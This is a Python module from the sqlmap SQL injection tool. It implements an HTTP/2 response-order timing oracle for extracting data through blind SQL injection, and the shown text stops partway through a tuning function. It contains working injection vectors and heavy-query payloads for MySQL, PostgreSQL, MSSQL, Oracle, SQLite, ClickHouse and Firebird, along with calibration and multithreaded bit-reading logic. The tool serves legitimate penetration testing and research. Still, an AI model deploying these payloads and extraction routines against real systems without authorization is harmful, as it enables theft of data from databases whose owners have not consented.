#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

# HTTP/2 "timeless timing" oracle (Van Goethem et al., USENIX Security 2020) built on the native
# client's exchange_pair() primitive (lib/request/http2.py). Two requests are coalesced into a single
# TCP write and multiplexed on one connection; because they share the packet and the path, network
# jitter hits both equally and cancels, so the RELATIVE order in which their responses complete reflects
# only the server-side processing delta. That lets a millisecond (or sub-ms) difference in query work be
# read that absolute wall-clock timing, drowned by jitter, cannot resolve - and it needs no SLEEP: the
# NATURAL execution-time gap between a true and a false boolean branch is signal enough on most engines.
#
# The oracle is only valid when the target processes the two streams CONCURRENTLY; a serializing
# front-proxy makes order track arrival, not work. calibrate() detects that (and estimates the readable
# delta) so the caller never applies the oracle blind - it falls back to classic time-based instead.

import socket
import ssl
import threading

from lib.core.enums import DBMS
from lib.request.http2 import _H2Connection

# Serializes the one-shot autoEngage() so concurrent worker threads never double-calibrate/double-engage.
_engageLock = threading.Lock()

# Transport-level failures that mean "this connection/attempt is unusable" - covers a mid-exchange drop
# (GOAWAY, reset) as well as a failed (re)connect, including the h2 client's own IOError when the server
# does not negotiate ALPN 'h2' on a fresh socket (seen on backends that speak h2 inconsistently, e.g. only
# some nodes behind a load balancer). Shared by _pairOrder (per-pair retry) and connect.py (the give-up path).
CONNECTIVITY_ERRORS = (socket.error, ssl.SSLError, IOError)


def buildConditionPair(condition, heavy, cheap="0"):
    """Turn a boolean `condition` (the same comparison bisection injects at INFERENCE_MARKER, e.g.
    'ORD(...)>64') into the two INFERENCE expressions the timeless oracle needs: one that makes the DB
    do the expensive `heavy` work iff the condition is TRUE, and its mirror that does the SAME heavy work
    iff the condition is FALSE. Exactly one of the pair runs heavy for any given row, so response order
    names the bit - with NO SLEEP, purely from the natural cost of `heavy`. Both expressions are valid
    booleans (>=0 always holds) so they never change the page, keeping the channel blind.

    `heavy` is a DBMS-specific bounded-cost scalar subquery (a partial scan / expensive function);
    `cheap` is a constant. CASE/WHEN is used so the branch is gated deterministically rather than relying
    on optimiser short-circuit.

    >>> c, n = buildConditionPair("ORD(x)>64", "SELECT COUNT(*) FROM t")
    >>> c
    '(CASE WHEN (ORD(x)>64) THEN (SELECT COUNT(*) FROM t) ELSE (0) END)>=0'
    >>> n
    '(CASE WHEN (ORD(x)>64) THEN (0) ELSE (SELECT COUNT(*) FROM t) END)>=0'
    """
    condExpr = "(CASE WHEN (%s) THEN (%s) ELSE (%s) END)>=0" % (condition, heavy, cheap)
    negExpr = "(CASE WHEN (%s) THEN (%s) ELSE (%s) END)>=0" % (condition, cheap, heavy)
    return condExpr, negExpr


def _pairOrder(connSource, reqA, reqB, timeout, retries=2):
    """Send reqA and reqB as one coalesced pair; return the stream id that finished FIRST plus the two
    stream ids in send order (reqA got the lower id).

    `connSource` is either a live _H2Connection or a zero-arg callable returning one. The callable form
    lets a dropped connection be replaced transparently and the pair re-sent: a long extraction routinely
    outlives a single HTTP/2 connection (the server retires it with GOAWAY after its per-connection request
    cap), and a coalesced boolean-read pair is idempotent, so re-sending it on a fresh connection is safe.
    Opening that fresh connection is retried the same way - it can fail just like an in-progress exchange
    (including ALPN renegotiation failing on the new socket). A raw connection (used by calibration and the
    self-test) is not retried - it simply raises."""
    attempt = 0
    while True:
        conn = None
        try:
            conn = connSource() if callable(connSource) else connSource
            order, _results = conn.exchange_pair([reqA, reqB], timeout)
            return order[0], conn.next_sid - 4, conn.next_sid - 2
        except CONNECTIVITY_ERRORS:
            if conn is not None:
                conn.close()                            # retire; a callable source reopens on the next pass
            attempt += 1
            if not callable(connSource) or attempt > retries:
                raise


def readBit(connSource, reqCond, reqNeg, votes=5, timeout=30):
    """Read one boolean by the cond-last FRACTION over symmetric pairs, ESCALATING when the fraction is
    ambiguous (load-degraded). `connSource` is a live connection or a factory (see _pairOrder) so a
    connection dropped mid-vote (e.g. server GOAWAY) is replaced and that pair re-sent transparently.

    reqCond does the heavy work iff the guessed condition is TRUE; reqNeg does the SAME heavy work iff the
    condition is FALSE (it carries the negated condition). Exactly one runs heavy, so whichever finishes
    LAST names the answer. Each vote alternates which stream id carries reqCond (cancels lower-id-first bias)
    and counts how often reqCond finished last:
      - real TRUE  -> reqCond (heavy) finishes last almost every vote -> fraction ~1.0
      - real FALSE -> reqNeg (heavy) finishes last -> fraction ~0.0
      - END-OF-STRING -> the comparison is NULL, and negatePayload's NULL-safe negation makes reqNeg run
        heavy on that NULL, so reqCond finishes first -> fraction ~0.0 (on a DBMS that instead ERRORS past
        the end - CockroachDB - both requests error and it is a ~0.5 coin flip).
    Decision: fraction >= 0.8 -> TRUE; <= 0.5 -> FALSE (covers real-false ~0, NULL end-of-string ~0, and
    CockroachDB error end-of-string ~0.5, so the string terminates cleanly instead of inventing phantom
    trailing characters). The 0.5-0.8 band is where a genuine TRUE bit lands when self-induced load (e.g.
    --threads: N value-parallel workers => ~Nx heavy queries contend and add jitter, though calibration was
    single-threaded) drags its fraction down; that is NOT a mean shift but variance, so we ESCALATE - keep
    voting up to a cap and average it out - which recovers it above 0.8 without lowering the threshold (a
    lower threshold would misread CockroachDB's ~0.5 error-eos as a character). SYMMETRIC, so the base query
    time cancels - robust where absolute pair-time, gap, and always-heavy-reference signals are confounded."""
    condLast, i = 0, 0
    cap = votes * 5                     # escalation ceiling for ambiguous (load-degraded) bits
    while True:
        if i % 2 == 0:
            first, loSid, _hiSid = _pairOrder(connSource, reqCond, reqNeg, timeout)
            condSid = loSid
        else:
            first, _loSid, hiSid = _pairOrder(connSource, reqNeg, reqCond, timeout)
            condSid = hiSid
        if first != condSid:            # reqCond finished last -> it ran heavy -> vote says TRUE
            condLast += 1
        i += 1
        if i < votes:                   # gather a minimum sample before deciding
            continue
        fraction = condLast / float(i)
        if fraction >= 0.8:
            return True
        if fraction <= 0.5:
            return False
        if i >= cap:                    # still ambiguous after escalating -> decide by the same threshold
            return fraction >= 0.8


def calibrate(conn, reqSlow, reqFast, trials=40, threshold=0.9, timeout=30, progress=None):
    """Decide whether the target is usable for the timeless oracle. Sends a KNOWN-asymmetric pair
    (reqSlow does real extra work, reqFast short-circuits) in BOTH stream-id orderings; on a concurrent
    backend the slow request finishes last regardless of its id. Returns (usable, confidence) where
    confidence is the fraction of trials in which the slow request finished last. Below `threshold` the
    backend is serializing (or the delta is unreadable) -> caller must NOT use the oracle. `progress`, if
    given, is called once per trial so the caller can stream a progress indicator."""
    slowLast = 0
    for i in range(trials):
        if i % 2 == 0:
            first, loSid, _hiSid = _pairOrder(conn, reqSlow, reqFast, timeout)
            slowSid = loSid
        else:
            first, _loSid, hiSid = _pairOrder(conn, reqFast, reqSlow, timeout)
            slowSid = hiSid
        if first != slowSid:
            slowLast += 1
        if progress is not None:
            progress()
    confidence = slowLast / float(trials) if trials else 0.0
    return (confidence >= threshold), confidence


def connect(host, port=443, proxy=None, timeout=30):
    """Open a dedicated HTTP/2 connection for timeless probing (kept separate from the request pool so
    its multiplexed pairs never interleave with ordinary single-stream traffic)."""
    return _H2Connection(host, port, proxy, timeout)


class TimelessOracle(object):
    """The engaged timeless-timing oracle, held on kb.timeless while active. queryPage() routes every
    boolean comparison (timeBasedCompare requests) here instead of measuring wall-clock time: it takes the
    already-assembled condition request (built via buildOnly), pairs it against a FIXED always-heavy
    reference and reads the bit from response order. This reuses the entire bisection/inference/threading
    stack unchanged - bisection just calls queryPage and gets a bool.

    Thread safety: each worker thread gets its OWN H2 connection (threading.local), mirroring keepalive.py
    and the http2 pool - streams from different threads never interleave on one socket, so parallel
    per-value extraction (--threads / _threadedInferenceValues) is safe. The reference request is an
    immutable spec-derived dict, so it is shared read-only across threads."""

    def __init__(self, host, port, refReq, proxy=None, asymVotes=12, votes=5, timeout=30):
        self.host, self.port, self.proxy = host, port, proxy
        self.refReq = refReq            # fixed always-heavy reference request (asymmetric tiebreak)
        self.asymVotes = asymVotes      # asymmetric tiebreak: fixed pairs, fraction-thresholded
        self.votes = votes              # symmetric: pairs per bit, cond-last fraction thresholded (readBit);
                                        # enough votes that TRUE ~100% and end-of-string ~50% separate cleanly
        self.timeout = timeout
        self._local = threading.local()
        self._conns = []                # every opened connection, for clean teardown
        self._lock = threading.Lock()
        self.savedTechnique = None      # active technique whose vector we swapped (restored on disengage)
        self.savedVector = None

    def _conn(self):
        conn = getattr(self._local, "conn", None)
        if conn is None or not conn.usable:
            if conn is not None:                        # retire the dead one so reconnects don't leak sockets
                try:
                    conn.close()
                except Exception:
                    pass
                with self._lock:
                    try:
                        self._conns.remove(conn)
                    except ValueError:
                        pass
            conn = self._local.conn = connect(self.host, self.port, self.proxy, self.timeout)
            with self._lock:
                self._conns.append(conn)
        return conn

    def readBitFromSpecs(self, condSpec, negSpec=None):
        """Read the bit from the assembled condition request and, when available, its negation. With a
        negSpec the SYMMETRIC oracle is used (cond-last fraction over votes - base query time cancels, so it
        stays reliable on heavy/noisy enumeration queries and detects end-of-string as the ~50% split). The
        asymmetric-vs-reference path is only a fallback for a non-sentinel vector (no negSpec) and must not
        be used for a heavy-base condition (the trivial-base reference is not comparable). Specs are the
        (url, method, headers, post) tuples from getPage(buildOnly=True)."""
        reqCond = _specToReq(condSpec, self.host)
        # Pass the bound _conn factory (not a resolved connection) so a pair whose connection is retired
        # mid-read (server GOAWAY on a long dump) is transparently re-sent on a fresh one.
        if negSpec is not None:
            return readBit(self._conn, reqCond, _specToReq(negSpec, self.host), votes=self.votes, timeout=self.timeout)
        return readBitAsymmetric(self._conn, reqCond, self.refReq, self.asymVotes, self.timeout)

    def close(self):
        with self._lock:
            for conn in self._conns:
                try:
                    conn.close()
                except Exception:
                    pass
            self._conns = []


def engage(host, port, vector, proxy=None, timeout=30):
    """Build the fixed always-heavy reference from `vector` (INFERENCE=1=1) and install a per-thread
    TimelessOracle on kb.timeless (connections open lazily per worker thread). queryPage picks it up
    automatically. Call disengage() when done. `vector` is the tuned rung-2 heavy vector (see tuneHeavy).
    The reference is used by the asymmetric tiebreak when a symmetric read splits (end-of-string / noise)."""
    from lib.core.data import kb

    refReq = _forgeRequest("1=1", host, vector)
    kb.timeless = TimelessOracle(host, port, refReq, proxy=proxy, timeout=timeout)
    return kb.timeless


def disengage():
    """Tear down the timeless oracle and close all per-thread connections."""
    from lib.core.data import kb

    oracle = kb.get("timeless")
    if oracle is not None:
        if oracle.savedTechnique is not None:
            try:
                from lib.core.common import getTechniqueData
                getTechniqueData(oracle.savedTechnique).vector = oracle.savedVector
            except Exception:
                pass
        oracle.close()
        kb.timeless = None


def hintTimeless():
    """Advisory nudge: when a scan is about to rely on TIME-based blind (the slowest channel) and the user
    did NOT pass '--timeless', probe the target for HTTP/2 and, if it speaks it, suggest '--timeless' once.
    Only fires when time-based is the channel that will actually be used (no faster in-band option) so the
    hint is never noise. Purely advisory, never raises, at most one message per run."""
    from lib.core.data import conf, kb
    from lib.core.common import isTechniqueAvailable, singleTimeWarnMessage
    from lib.core.enums import PAYLOAD

    try:
        if conf.get("timeless") or kb.get("timelessHinted"):
            return
        kb.timelessHinted = True

        # only relevant when time-based is the chosen channel (a faster in-band one would be used instead)
        if not isTechniqueAvailable(PAYLOAD.TECHNIQUE.TIME):
            return
        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.BOOLEAN)):
            return

        try:
            from urllib.parse import urlsplit
        except ImportError:
            from urlparse import urlsplit
        parts = urlsplit(conf.url or "")
        if parts.scheme != "https":
            return

        # cheap one-connection HTTP/2 ALPN probe: connect() raises unless the server negotiates 'h2'
        conn = connect(parts.hostname, parts.port or 443, None, conf.timeout or 30)
        conn.close()
        singleTimeWarnMessage("target speaks HTTP/2 - switch '--timeless' can extract this time-based injection "
                              "by relative response order (no delay), typically far faster. Consider re-running with '--timeless'")
    except Exception:
        pass


def autoEngage():
    """Attempt to engage the timeless oracle for the current target's EXTRACTION phase. Called once by
    action() after detection (so the heavy vector is swapped in BEFORE any extraction payload is built).
    Requires '--timeless', an https/HTTP-2 target, and a confirmed time-based technique on a DBMS with a
    light-heavy primitive; calibrates + tunes and only engages if the response-order signal is reliable
    (the safety gate) - otherwise the scan silently keeps using classic time-based. Never raises."""
    from lib.core.data import conf, kb, logger
    from lib.core.common import Backend

    with _engageLock:
        if kb.get("timeless") is not None:
            return True
        return _doAutoEngage(conf, kb, logger, Backend)


def _doAutoEngage(conf, kb, logger, Backend):
    try:
        if not conf.get("timeless"):
            return False

        # Never during detection - that phase confirms the vuln (and runs the false-positive check) by
        # measuring REAL induced delays, which response-order would break. kb.testMode is True throughout
        # detection and False once extraction begins.
        if kb.get("testMode"):
            return False

        # Timeless accelerates TIME-based extraction, so it needs a CONFIRMED time-based technique whose
        # data carries an [INFERENCE] vector - that vector is what we swap for the tuned heavy one.
        from lib.core.enums import PAYLOAD
        from lib.core.settings import INFERENCE_MARKER
        timeData = kb.injection.data.get(PAYLOAD.TECHNIQUE.TIME) if (kb.injection and kb.injection.data) else None
        if not timeData or INFERENCE_MARKER not in (timeData.vector or ""):
            return False

        try:
            from urllib.parse import urlsplit
        except ImportError:
            from urlparse import urlsplit
        parts = urlsplit(conf.url or "")
        if parts.scheme != "https":
            logger.warning("'--timeless' requires an https/HTTP-2 target. Falling back to classic time-based")
            return False

        host, port = parts.hostname, parts.port or 443
        dbms = Backend.getIdentifiedDbms()
        if lightHeavyVector(dbms, LIGHT_HEAVY_COSTS[0]) is None:
            logger.warning("'--timeless' has no heavy-query primitive for DBMS '%s' yet. Falling back to classic time-based" % dbms)
            return False

        # Calibration sends a few hundred coalesced probe-pairs to measure the target's response-order
        # reliability and tune the work size - that is the pause the user sees before engagement. Announce
        # it and stream a dot per probe, mirroring the classic time-based "statistical model, please wait".
        import time as _time
        from lib.core.common import dataToStdout
        dataToStdout("[%s] [INFO] calibrating HTTP/2 timeless timing on '%s' (measuring response-order reliability), please wait" % (_time.strftime("%X"), dbms))
        probe = connect(host, port, None, conf.timeout or 30)
        # value-parallel dumping runs conf.threads workers concurrently, each firing heavy queries; demand
        # that much more calibration margin so the tuned cost survives the self-induced load (see tuneHeavy).
        loadFactor = max(1, conf.threads or 1)
        try:
            vector, cost, confidence = tuneHeavy(probe, dbms=dbms, progress=lambda: dataToStdout('.'), loadFactor=loadFactor)
        finally:
            probe.close()
            dataToStdout(" (done)\n")

        if not vector:
            logger.warning("HTTP/2 timeless timing is not usable on this target (confidence %.2f, backend likely serializes streams). Falling back to classic time-based" % confidence)
            return False

        oracle = engage(host, port, vector, timeout=conf.timeout or 30)
        # Votes per bit for the cond-last fraction: enough that a real TRUE (~100%) clears the 80% threshold
        # and end-of-string (~50%) stays below it, with headroom for jitter. A perfectly-calibrated target
        # needs fewer; a marginal one gets more. (No validateChar re-check runs under timeless.)
        oracle.votes = 5 if confidence >= 1.0 else 9

        # bisection forges its comparison payloads from the TIME technique's vector - swap in the tuned
        # heavy (sentinel) vector NOW (before extraction builds any payload) so every condition request
        # gates the heavy branch and carries the sentinels the symmetric oracle negates. Restored on
        # disengage().
        oracle.savedTechnique = PAYLOAD.TECHNIQUE.TIME
        oracle.savedVector = timeData.vector
        timeData.vector = vector

        logger.info("turning on HTTP/2 timeless timing (heavy cost %d, calibration %.2f) - reading bits by response order, no delay" % (cost, confidence))
        return True
    except Exception as ex:
        from lib.core.common import getSafeExString
        logger.warning("HTTP/2 timeless timing setup failed ('%s'). Falling back to classic time-based" % getSafeExString(ex))
        return False


# Connection/h2-forbidden request headers that a coalesced pair must not carry (open_url strips the same
# set for single requests); ':authority' replaces Host, and content-length/framing are h2's job.
_FORBIDDEN_HEADERS = frozenset(("host", "connection", "keep-alive", "proxy-connection",
                                "transfer-encoding", "upgrade", "content-length"))


def _specToReq(spec, fallbackAuthority):
    """Convert the (url, method, headers, post) tuple that Connect.getPage(buildOnly=True) returns into
    the request dict exchange_pair expects."""
    try:
        from urllib.parse import urlsplit
    except ImportError:
        from urlparse import urlsplit

    url, method, headers, post = spec
    parts = urlsplit(url)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    reqHeaders = {}
    for key in (headers or {}):
        name = key.decode("latin-1") if isinstance(key, bytes) else key
        if name.lower() not in _FORBIDDEN_HEADERS:
            reqHeaders[key] = headers[key]
    return {"method": method, "path": path, "authority": (parts.netloc.split("@")[-1] or fallbackAuthority),
            "headers": reqHeaders, "body": post}


def getHeavyVector(dbms=None):
    """Return the raw heavy-query time-based vector shipped for `dbms` (default: the identified back-end),
    reused verbatim as the timeless rung-2 payload - it is already an '... IF/CASE (INFERENCE) THEN <heavy>
    ELSE <cheap> ...' gate, WAF-tuned and per-DBMS, so the heavy work provides the natural delta with no
    SLEEP. Prefers the plain 'AND' boundary variant. Returns None if none is loaded."""
    from lib.core.data import conf
    from lib.core.common import Backend

    dbms = dbms or Backend.getIdentifiedDbms()
    if not dbms:
        return None

    andVector = orVector = None
    for test in (conf.tests or []):
        title = (test.get("title") or "")
        if "heavy query" not in title.lower():
            continue
        testDbms = ((test.get("details") or {}).get("dbms")) or ""
        testDbms = testDbms if isinstance(testDbms, str) else " ".join(testDbms)
        # tolerate combined labels like "Microsoft SQL Server/Sybase"
        if not (dbms.lower() in testDbms.lower() or any(part.strip().lower() == dbms.lower() for part in testDbms.split('/'))):
            continue
        vector = (test.get("vector") or "").strip()
        # Only the inband boundary variants splice into a WHERE clause; skip stacked (';...') and inline forms.
        if vector.upper().startswith("AND "):
            andVector = andVector or vector
        elif vector.upper().startswith("OR "):
            orVector = orVector or vector
    return andVector or orVector


# Light, TUNABLE heavy primitives for timeless rung 2. The shipped heavy-query vectors are tuned for
# absolute-timing thresholds (seconds) - e.g. SQLite RANDOMBLOB([SLEEPTIME]00000000/2) is ~50MB/request -
# which is both needlessly slow AND a DoS risk. Timeless only needs a few milliseconds above the target's
# scheduling noise, so we generate the SAME bounded-work idioms (series / catalog cross-joins) capped by a
# [COST] the calibrator dials UP from a small default until the response-order signal is reliable. That
# self-tunes to the lightest payload that works - fast, and never allocates a huge blob.
# [COST] is replaced with a row count; each primitive is a scalar sub-select doing ~[COST] units of
# bounded work. Grouped by dialect and keyed on sqlmap's canonical DBMS names (DBMS.* enum) so a fork
# (MariaDB->MySQL, CockroachDB->PostgreSQL, ...) resolves via its base DBMS, and there is no string drift.
# A DBMS absent here (or whose primitive is wrong on a given target) simply fails calibration and the scan
# falls back to classic time-based - the light-heavy is always safety-gated, never applied blind.
#
# SCOPE: timeless layers on top of a DETECTED time-based technique, so it can only ever engage on a DBMS
# that ships a time-based payload (data/xml/payloads/time_blind.xml): PostgreSQL, MySQL (+MariaDB/TiDB),
# Oracle, Microsoft SQL Server, Sybase, SQLite, Firebird, ClickHouse, IBM DB2, Informix, HSQLDB, SAP MaxDB.
# Engines with NO time-based payload (H2, MonetDB, CrateDB, Vertica, Presto/Trino, Snowflake) are never
# detected as injectable via time, so a light-heavy primitive for them is dead code - they are NOT listed.
#
# GATING & SAFETY: the heavy work must run for exactly ONE of a boolean condition and its negation, so
# response ORDER names the bit. It is gated by the shipped-vector shape `[RANDNUM]=(CASE WHEN (cond) THEN
# (<heavy>) ELSE [RANDNUM] END)` - the THEN branch does the work iff cond holds, the ELSE is a cheap literal.
# Some optimisers HOIST an uncorrelated scalar subquery out of the CASE and run it in BOTH branches (seen on
# TiDB with `(SELECT BENCHMARK(N,MD5(1)))`; MySQL 8.4 does not). That is not a correctness hazard here: when
# both branches do equal work the measured delta is ~0, so tuneHeavy's MIN_HEAVY_MS gate REJECTS the rung
# and the scan falls back to classic time-based - correct data, just no timeless speedup. Corruption only
# ever came from ENGAGING with a tiny-but-nonzero delta that flips under load; requiring MIN_HEAVY_MS of
# real server-side delay (not just a reliable idle order) is the fix for that, and it is primitive-agnostic.
# So the rule is simply: pick the strongest per-DBMS bounded primitive; if a target hoists/folds it to a
# sub-threshold delta, it safely falls back. Keyed on DBMS.* so forks resolve via their base DBMS
# (MariaDB/TiDB->MySQL, CockroachDB->PostgreSQL).
_LH_MYSQL = "(SELECT BENCHMARK([COST],MD5(1)))"                                                              # MySQL/MariaDB: CPU burn, O(1) memory (TiDB hoists -> safe fallback)
_LH_MSSQL = "(SELECT LEN(HASHBYTES('SHA2_512',REPLICATE(CAST('a' AS VARCHAR(MAX)),[COST]))))"               # MSSQL/Sybase (VARCHAR(MAX) bypasses REPLICATE's 8000-byte cap)

LIGHT_HEAVY = {
    DBMS.PGSQL: "(SELECT COUNT(*) FROM GENERATE_SERIES(1,[COST]))",                                          # PG materialises the series
    DBMS.MYSQL: _LH_MYSQL,
    DBMS.MSSQL: _LH_MSSQL,
    DBMS.SYBASE: _LH_MSSQL,
    DBMS.ORACLE: "(SELECT COUNT(*) FROM DUAL CONNECT BY LEVEL<=[COST])",
    # recursive CTE - rows depend on the previous, so the engine must produce them one by one (never folded)
    DBMS.SQLITE: "(SELECT COUNT(*) FROM (WITH RECURSIVE _c(_x) AS (SELECT 1 UNION ALL SELECT _x+1 FROM _c LIMIT [COST]) SELECT _x FROM _c))",
    # ClickHouse ships a time-based payload; a plain COUNT folds (columnar) so force a per-row hash
    DBMS.CLICKHOUSE: "(SELECT COUNT(*) FROM numbers([COST]) WHERE MD5(toString(number))='zz')",
    # Firebird best-effort: no generator, recursion<=1024, strings<=32 KB -> fixed system-catalog cross-join
    DBMS.FIREBIRD: "(SELECT SUM(a.RDB$RELATION_ID) FROM RDB$RELATIONS a, RDB$RELATIONS b, RDB$RELATIONS c)",
    # NOTE: DB2/Informix/HSQLDB/SAP MaxDB ship time-based payloads but have no validated light-heavy here ->
    # no entry -> they gracefully fall back to classic time-based (SLEEP/heavy-query) extraction.
}

# Ascending cost ladder tuneHeavy walks ([COST] = generator rows / recursion depth / BENCHMARK iterations /
# string length). It escalates until the MEASURED server-side heavy delta is >= MIN_HEAVY_MS (a real time
# margin so bits don't flip under extraction load) AND the response-order calibrates reliably. The same
# [COST] costs very different time per primitive (a generator row << a BENCHMARK MD5 iteration), so the
# ladder is walked by measured time, not a fixed floor - each engine lands on whatever rung first clears the
# margin. The low rungs let CPU-dense primitives land near 20-60 ms instead of overshooting. Top is 4M so
# string primitives allocate at most ~4 MB (memory-safe, no spill/DoS). If even 4M can't reach MIN_HEAVY_MS
# reliably the target is too noisy/fast-to-read -> fall back to classic. Correctness beats ms - a flip means
# re-extract.
LIGHT_HEAVY_COSTS = (20000, 60000, 200000, 600000, 2000000, 4000000)
MIN_HEAVY_MS = 15.0    # required server-side heavy delta; ~15 ms clears realistic multi-hop extraction-load jitter
# The heavy/cheap PAIR separation must also be >= this fraction of the base (cheap) pair time - an absolute
# floor alone is marginal on a slow multi-hop path (a 15 ms margin on a ~50 ms base flips ~10% of bits under
# load); requiring a relative margin makes such a target climb to a robustly-separated cost. See tuneHeavy.
MIN_SEPARATION_FRAC = 0.5

# DBMSes whose primitive is a bounded GENERATOR whose row count sits in the [COST] slot. For these the bit
# gates the WORK AMOUNT (the count) rather than selecting between a heavy and a cheap CASE branch. This is
# what makes the oracle survive optimisers that DECORRELATE/HOIST an uncorrelated scalar subquery out of a
# CASE and run it in BOTH branches (observed on CockroachDB with GENERATE_SERIES for a non-foldable
# condition - the false branch still materialised the full series, so cond and neg were BOTH heavy and the
# response order was a coin flip -> corruption). With the count itself computed from the bit
# (GENERATE_SERIES(1, CASE WHEN cond THEN [COST] ELSE 1)) there is no constant subquery to hoist: the engine
# must evaluate the CASE first and only then generate that many rows, so exactly one of cond/neg does the
# work. CONNECT BY LEVEL<=expr and LIMIT expr are standard, so Oracle/SQLite use the same form. Validated
# end-to-end on CockroachDB (was corrupting, now reads 1.00) and PostgreSQL (still engages, unchanged).
_GATED_COST = frozenset((DBMS.PGSQL, DBMS.ORACLE, DBMS.SQLITE))


# Inert SQL-comment sentinels bracketing the injected comparison inside the heavy vector. They let the
# oracle build the exact NEGATED payload (heavy-iff-false) from the forged condition payload by a single
# regex - enabling the SYMMETRIC oracle (condition vs its negation, exactly one runs heavy, 1 pair reads
# the bit both ways) without any change to bisection. Comments are ignored by the DBMS parser.
INFERENCE_BEGIN = "/*tlb*/"
INFERENCE_END = "/*tle*/"


def lightHeavyVector(dbms, cost):
    """Return the timeless rung-2 vector for `dbms` doing ~`cost` units of bounded work (or None if no
    primitive is defined). The INFERENCE slot is bracketed with sentinels so negatePayload() can derive the
    mirror for the symmetric oracle (condition vs its negation, exactly one runs heavy).

    Two gating shapes, both flowing through the exact same payload machinery:
      - GENERATOR primitives (see _GATED_COST): the bit is placed INSIDE the row-count bound
        (GENERATE_SERIES(1, CASE WHEN cond THEN [COST] ELSE 1)), so there is no constant subquery for an
        optimiser to hoist out of a CASE and run in both branches - the count itself depends on the bit.
      - Everything else: the classic '[RANDNUM]=(CASE WHEN cond THEN <heavy> ELSE [RANDNUM])' branch, used
        where the cost slot must stay constant (MySQL BENCHMARK) or there is no numeric cost (Firebird);
        these engines were validated not to hoist.
    Either way tuneHeavy's MIN_HEAVY_MS gate + faithful (uncorrelated) calibration mean a target that still
    manages an unreadable delta simply fails calibration and falls back to classic - never corrupts."""
    primitive = LIGHT_HEAVY.get(dbms)
    if not primitive:
        return None
    if dbms in _GATED_COST:
        gate = "(CASE WHEN (%s[INFERENCE]%s) THEN %d ELSE 1 END)" % (INFERENCE_BEGIN, INFERENCE_END, int(cost))
        heavy = primitive.replace("[COST]", gate)
        return "AND [RANDNUM]<%s" % heavy
    heavy = primitive.replace("[COST]", str(int(cost)))
    return "AND [RANDNUM]=(CASE WHEN (%s[INFERENCE]%s) THEN (%s) ELSE [RANDNUM] END)" % (INFERENCE_BEGIN, INFERENCE_END, heavy)


def negatePayload(value):
    """Return `value` with the sentinel-bracketed comparison replaced by a NULL-SAFE negation, or None if
    no sentinel pair is present (a non-timeless vector). Used to build the symmetric oracle's negated
    request (the request whose heavy branch must run iff the condition does NOT hold).

    The negation is `(CASE WHEN (cond) THEN 1 ELSE 0 END)=0`, which is TRUE iff `cond` is false OR NULL -
    NOT plain `NOT(cond)`. This is the end-of-string fix: past the end of a string the comparison
    (ASCII(SUBSTR(...))>n) is NULL, and `NOT(NULL)` is NULL, so with plain NOT NEITHER the condition nor
    its negation forces the heavy branch - both requests stay cheap and the response order is left to
    secondary noise (measured ~0.6 cond-last on Oracle, not a clean coin flip), which invents phantom
    trailing characters. With the CASE form the negation's ELSE catches NULL, so at end-of-string the
    NEGATION request runs heavy and the condition request stays cheap: the condition finishes first every
    vote (fraction ~0), read as False, and the string terminates cleanly. CASE + integer '=0' is portable
    across every DBMS (unlike `IS NOT TRUE`)."""
    import re

    pattern = re.compile(r"%s(.*?)%s" % (re.escape(INFERENCE_BEGIN), re.escape(INFERENCE_END)))
    if not pattern.search(value or ""):
        return None
    return pattern.sub(lambda m: "%s(CASE WHEN (%s) THEN 1 ELSE 0 END)=0%s" % (INFERENCE_BEGIN, m.group(1), INFERENCE_END), value)


def _pairMs(conn, reqA, reqB, samples=5, timeout=30):
    """Median wall-clock of the coalesced PAIR (reqA, reqB) until BOTH streams finish - tracks the heavy
    branch when one is heavy, bare round-trip when none. Used for the reliability/separation gate that
    decides which cost to engage at (see tuneHeavy)."""
    import time as _t

    ts = []
    for _ in range(samples):
        s = _t.time()
        _pairOrder(conn, reqA, reqB, timeout)
        ts.append((_t.time() - s) * 1000.0)
    return sorted(ts)[samples // 2]


def _calibrationConditions(dbms):
    """Return (trueCond, falseCond): a KNOWN-true and KNOWN-false boolean of the SAME shape real
    extraction injects - the per-DBMS inference comparison applied to the version banner, i.e. an
    UNCORRELATED, non-constant-foldable predicate (e.g. ASCII(SUBSTRING((VERSION())::text FROM 1 FOR 1))>1
    for true, >255 for false). This matters because some optimisers (CockroachDB, TiDB, ...) HOIST the
    uncorrelated heavy subquery out of the CASE and run it in BOTH branches for such a predicate, while a
    CONSTANT-foldable probe like '1=1'/'1=0' lets them prune the dead branch at plan time - so calibrating
    with the constant sees a clean heavy delta the REAL extraction never has and engages straight into
    corruption (bits become a coin flip). Calibrating with the faithful predicate makes a hoisting target
    measure ~0 server-side delta on every rung, so tuneHeavy's MIN_HEAVY_MS gate rejects it and the scan
    safely falls back to classic time-based. Falls back to the constant probes when the DBMS ships no
    inference/banner template (calibration still gates, just without the hoist check)."""
    from lib.core.data import queries

    try:
        entry = queries[dbms]
        template = entry.inference.query      # e.g. 'ASCII(SUBSTRING((%s)::text FROM %d FOR 1))>%d'
        banner = entry.banner.query           # e.g. 'VERSION()' / 'SELECT @@VERSION'
        # int value works for both '>%d' and quoted-char '>%c' templates (chr(1)/chr(255) stay in-range)
        return (template % (banner, 1, 1), template % (banner, 1, 255))
    except Exception:
        return ("1=1", "1=0")


def tuneHeavy(conn, dbms=None, trials=50, threshold=0.97, timeout=30, progress=None, loadFactor=1):
    """Walk the cost ladder and return (vector, cost, confidence) for the LIGHTEST rung-2 heavy
    that is BOTH (a) big enough in absolute server-side time (>= MIN_HEAVY_MS) to survive extraction load,
    and (b) whose response-order signal calibrates as reliable. Returns (None, None, best_confidence) if
    none qualifies.

    Requirement (a) is the fix for the fixed-[COST]-means-different-time trap: PostgreSQL generate_series(N)
    and MySQL SHA2(REPEAT('a',N)) at the SAME N differ ~10x in wall time, so a fixed floor that is fine for a
    generator is a ~1-2 ms nothing for a hash - which calibrates fine IDLE (order reliable) then flips bits
    under load. Measuring the real delta and requiring a margin makes the tuning primitive-agnostic and
    load-robust; on a fast single-hop backend the smallest qualifying cost is still tiny."""
    from lib.core.common import Backend

    dbms = dbms or Backend.getIdentifiedDbms()
    # Probe with the faithful (uncorrelated, non-foldable) extraction predicate, NOT constant 1=1/1=0, so a
